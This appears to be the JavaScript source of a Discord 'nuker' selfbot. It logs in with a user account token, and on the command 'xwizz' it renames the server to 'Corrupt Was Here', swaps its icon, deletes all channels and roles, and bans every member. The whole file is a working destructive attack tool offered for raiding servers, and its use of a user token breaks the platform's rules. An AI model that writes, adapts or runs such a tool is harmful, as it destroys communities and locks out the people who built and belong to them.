const Versace = require('versace.js')  // Discord Wrapper made by Antichrist
const selfbot = new Versace.Client()
const settings = require('./settings.json')

// Ready Event
selfbot.on('ready', () => {
    console.log(`Nuker online: ${selfbot.user.tag}`)
    })

// Message Event
selfbot.on('message', msg => {
    if(msg.author.id === selfbot.user.id){
   const prefix = 'x'
  if (!msg.content.startsWith(prefix) || msg.author.bot) return;
  const args = msg.content.slice(prefix.length).split(' ');
  const command = args.shift().toLowerCase();
  const commandargs = args.slice().join(' ')
  if(command === 'ping'){
      msg.channel.send(`PONG!: ${Math.round(selfbot.ping)}`)
  }
  if(command === 'wizz'){
   if(msg.channel.type !== 'text'){
       msg.channel.send(`This only works in servers`)
   }  

   //Changes Server Name
   msg.guild.setName('Corrupt Was Here').then(() => {
       console.log(`Changed server name`)
   }).catch(() => console.error)
   
   //Changes Server ICON
   msg.guild.setIcon('https://media.discordapp.net/attachments/699767220368179342/746753029688000622/Screenshot_2020-08-20_at_18.08.03.png').then(() => {
       console.log(`Changed sever icon`)
   }).catch(() => console.error)

   //Deletes All Channels
   msg.guild.channels.map(channel => {
       channel.delete().then(() => {
           console.log(`Channel Deleted: #${channel.name}`)
       }).catch(() => console.error)
   })

   //Deletes ALl Roles
   msg.guild.roles.map(role => {
    role.delete().then(() => {
        console.log(`Role Deleted: @${role.name}`)
    }).catch(() => console.error)
    
    //Bans Members
    msg.guild.members.map(member => {
        member.ban().then(() => {
            console.log(`${member.user.tag} was banned from ${msg.guild.name}`)
        }).catch(() => console.error)
    })

})

  }
}
})

//Login
selfbot.login(settings.token)
